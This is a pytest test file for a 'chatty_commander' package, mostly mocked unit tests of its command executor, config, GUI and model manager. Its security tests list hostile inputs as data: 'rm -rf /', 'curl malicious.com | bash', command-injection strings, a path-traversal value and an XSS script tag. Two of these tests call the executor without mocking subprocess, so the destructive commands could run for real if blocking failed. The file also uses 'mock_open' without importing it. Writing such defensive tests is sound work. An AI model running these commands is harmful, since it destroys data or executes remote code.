"""
Comprehensive tests for core package functionality.
Tests command_executor, config, gui, main, model_manager, and other core modules.
"""

import json
from unittest.mock import Mock, patch

import pytest

from chatty_commander.command_executor import CommandExecutor
from chatty_commander.config import ConfigManager
from chatty_commander.gui import ChatGUI
from chatty_commander.main import Application
from chatty_commander.model_manager import ModelManager


class TestCommandExecutor:
    """Test command executor functionality."""

    def test_command_executor_initialization(self):
        """Test command executor initialization."""
        executor = CommandExecutor()
        assert executor is not None

    def test_safe_command_execution(self):
        """Test safe command execution."""
        executor = CommandExecutor()

        with patch('subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout='Success')

            result = executor.execute_safe(['echo', 'test'])
            assert result.returncode == 0

    def test_dangerous_command_blocking(self):
        """Test dangerous command blocking."""
        executor = CommandExecutor()

        dangerous_commands = [
            ['rm', '-rf', '/'],
            ['sudo', 'rm', '-rf', '/'],
            ['> /dev/null; rm -rf /'],
            ['curl', 'malicious.com | bash']
        ]

        for cmd in dangerous_commands:
            result = executor.execute_safe(cmd)
            # Should be blocked or return error
            assert result is None or result.returncode != 0

    def test_command_timeout(self):
        """Test command timeout handling."""
        executor = CommandExecutor()

        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = TimeoutError("Command timed out")

            result = executor.execute_safe(['sleep', '10'], timeout=1)
            assert result is None


class TestConfigManager:
    """Test configuration manager functionality."""

    def test_config_manager_initialization(self):
        """Test config manager initialization."""
        config_manager = ConfigManager()
        assert config_manager is not None

    def test_config_loading(self):
        """Test configuration loading."""
        config_manager = ConfigManager()

        test_config = {
            "app_name": "test_app",
            "version": "1.0.0",
            "features": {
                "debug": True,
                "experimental": False
            }
        }

        with patch('builtins.open', mock_open(read_data=json.dumps(test_config))):
            with patch('os.path.exists', return_value=True):
                result = config_manager.load_config("test_config.json")
                assert result is not None

    def test_config_validation(self):
        """Test configuration validation."""
        config_manager = ConfigManager()

        valid_config = {
            "app_name": "test_app",
            "version": "1.0.0",
            "features": {
                "debug": True
            }
        }

        invalid_config = {
            "app_name": "",  # Invalid empty name
            "version": "not_a_version"
        }

        assert config_manager.validate_config(valid_config) is True
        assert config_manager.validate_config(invalid_config) is False

    def test_config_persistence(self):
        """Test configuration persistence."""
        config_manager = ConfigManager()

        test_config = {
            "app_name": "test_app",
            "version": "1.0.0"
        }

        with patch('builtins.open', mock_open()) as mock_file:
            config_manager.save_config(test_config, "test_config.json")
            mock_file.assert_called()


class TestChatGUI:
    """Test GUI functionality."""

    def test_gui_initialization(self):
        """Test GUI initialization."""
        gui = ChatGUI()
        assert gui is not None

    def test_gui_components(self):
        """Test GUI component creation."""
        gui = ChatGUI()

        with patch.object(gui, '_create_main_window') as mock_window:
            with patch.object(gui, '_create_chat_area') as mock_chat:
                with patch.object(gui, '_create_input_area') as mock_input:
                    with patch.object(gui, '_setup_bindings') as mock_bindings:
                        mock_window.return_value = True
                        mock_chat.return_value = True
                        mock_input.return_value = True
                        mock_bindings.return_value = True

                        result = gui.initialize()
                        assert result is True

    def test_gui_message_handling(self):
        """Test GUI message handling."""
        gui = ChatGUI()

        with patch.object(gui, '_display_message') as mock_display:
            mock_display.return_value = True

            result = gui.handle_message("Test message")
            assert result is True


class TestApplication:
    """Test main application functionality."""

    def test_application_initialization(self):
        """Test application initialization."""
        app = Application()
        assert app is not None

    def test_app_configuration(self):
        """Test application configuration."""
        app = Application()

        with patch.object(app, '_load_configuration') as mock_load:
            with patch.object(app, '_initialize_components') as mock_init:
                with patch.object(app, '_setup_logging') as mock_logging:
                    mock_load.return_value = True
                    mock_init.return_value = True
                    mock_logging.return_value = True

                    result = app.configure()
                    assert result is True

    def test_app_startup_shutdown(self):
        """Test application startup and shutdown."""
        app = Application()

        with patch.object(app, 'configure') as mock_configure:
            with patch.object(app, '_start_services') as mock_start:
                with patch.object(app, '_stop_services') as mock_stop:
                    mock_configure.return_value = True
                    mock_start.return_value = True
                    mock_stop.return_value = True

                    app.startup()
                    mock_configure.assert_called_once()
                    mock_start.assert_called_once()

                    app.shutdown()
                    mock_stop.assert_called_once()


class TestModelManager:
    """Test model manager functionality."""

    def test_model_manager_initialization(self):
        """Test model manager initialization."""
        model_manager = ModelManager()
        assert model_manager is not None

    def test_model_loading(self):
        """Test model loading."""
        model_manager = ModelManager()

        with patch.object(model_manager, '_download_model') as mock_download:
            with patch.object(model_manager, '_load_model_weights') as mock_load:
                with patch.object(model_manager, '_initialize_model') as mock_init:
                    mock_download.return_value = "/path/to/model"
                    mock_load.return_value = True
                    mock_init.return_value = True

                    result = model_manager.load_model("test_model")
                    assert result is True

    def test_model_unloading(self):
        """Test model unloading."""
        model_manager = ModelManager()

        with patch.object(model_manager, '_save_model_state') as mock_save:
            with patch.object(model_manager, '_cleanup_resources') as mock_cleanup:
                mock_save.return_value = True
                mock_cleanup.return_value = True

                result = model_manager.unload_model("test_model")
                assert result is True


class TestCoreIntegration:
    """Test core module integration."""

    def test_full_application_stack(self):
        """Test full application stack integration."""
        config_manager = ConfigManager()
        app = Application()
        gui = ChatGUI()

        # Test that all components can be initialized together
        assert config_manager is not None
        assert app is not None
        assert gui is not None

    def test_error_propagation(self):
        """Test error propagation across components."""
        config_manager = ConfigManager()
        app = Application()

        with patch.object(config_manager, 'load_config', side_effect=Exception("Config load failed")):
            with pytest.raises(Exception):
                config_manager.load_config("nonexistent.json")

            # App should still be able to handle its own errors
            app.configure()  # This might fail but shouldn't crash

    def test_resource_management(self):
        """Test resource management across components."""
        model_manager = ModelManager()

        with patch.object(model_manager, 'load_model') as mock_load:
            with patch.object(model_manager, 'unload_model') as mock_unload:
                mock_load.return_value = True
                mock_unload.return_value = True

                # Load and unload a model
                model_manager.load_model("test_model")
                model_manager.unload_model("test_model")

                # Verify both operations were attempted
                mock_load.assert_called_once()
                mock_unload.assert_called_once()


class TestCoreSecurity:
    """Test core security features."""

    def test_input_validation(self):
        """Test input validation across components."""
        config_manager = ConfigManager()

        # Test with malicious input
        malicious_config = {
            "app_name": "../../../etc/passwd",  # Path traversal
            "version": "<script>alert('xss')</script>"  # XSS attempt
        }

        # Should validate and reject malicious input
        result = config_manager.validate_config(malicious_config)
        assert result is False

    def test_command_injection_prevention(self):
        """Test command injection prevention."""
        executor = CommandExecutor()

        malicious_commands = [
            ["ls", "; rm -rf /"],
            ["echo", "test && rm -rf /"],
            ["curl", "http://malicious.com; rm -rf /"]
        ]

        for cmd in malicious_commands:
            result = executor.execute_safe(cmd)
            # Should be blocked
            assert result is None or result.returncode != 0


class TestCorePerformance:
    """Test core performance features."""

    def test_memory_management(self):
        """Test memory management."""
        model_manager = ModelManager()

        with patch.object(model_manager, '_monitor_memory') as mock_monitor:
            mock_monitor.return_value = {"memory_usage": "normal"}

            result = model_manager.check_memory_usage()
            assert "memory_usage" in result

    def test_concurrent_operations(self):
        """Test concurrent operations."""
        app = Application()

        with patch.object(app, '_handle_request') as mock_handle:
            mock_handle.return_value = {"status": "ok"}

            # Simulate multiple concurrent operations
            results = []
            for i in range(5):
                result = app.handle_request(f"request_{i}")
                results.append(result)

            assert len(results) == 5
            assert all(r["status"] == "ok" for r in results)
